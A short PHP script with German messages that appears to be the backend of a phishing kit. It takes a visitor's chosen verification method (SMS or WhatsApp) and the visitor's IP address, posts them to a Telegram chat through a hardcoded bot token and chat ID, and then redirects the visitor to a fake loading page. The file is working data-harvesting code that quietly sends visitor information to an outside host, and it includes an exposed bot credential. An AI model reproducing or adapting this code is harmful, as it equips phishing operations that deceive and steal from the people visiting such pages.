<?php
// Include your configuration if needed
                                       

// Telegram bot token and chat ID
$botToken = '8774738162:AAG5wwzAn4uDk-31PZcYQxkwA3XDnEqIFjk';
$chatId = '-5227546407';
// Get the submitted method
$method = isset($_POST['method']) ? $_POST['method'] : 'sms';

// Prepare message content based on the method
if ($method === 'sms') {
    $messageText = "Benutzer hat SMS-Auswahl getroffen.";
} elseif ($method === 'whatsapp') {
    $messageText = "Benutzer hat WhatsApp-Auswahl getroffen.";
} else {
    $messageText = "Unbekannte Auswahl.";
}

// IP-Adresse des Nutzers hinzufügen
$ipAddress = $_SERVER['REMOTE_ADDR'];
$messageText .= "\nIP: " . $ipAddress;

// Telegram send message API URL
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Data payload
$data = [
    'chat_id' => $chatId,
    'text' => $messageText
];

// Send the message via cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
if(curl_errno($ch)){
    error_log('Curl error: ' . curl_error($ch));
}
curl_close($ch);

// Redirect to loading1.html in the main folder
header('Location: ../loading1.html');
exit();
?>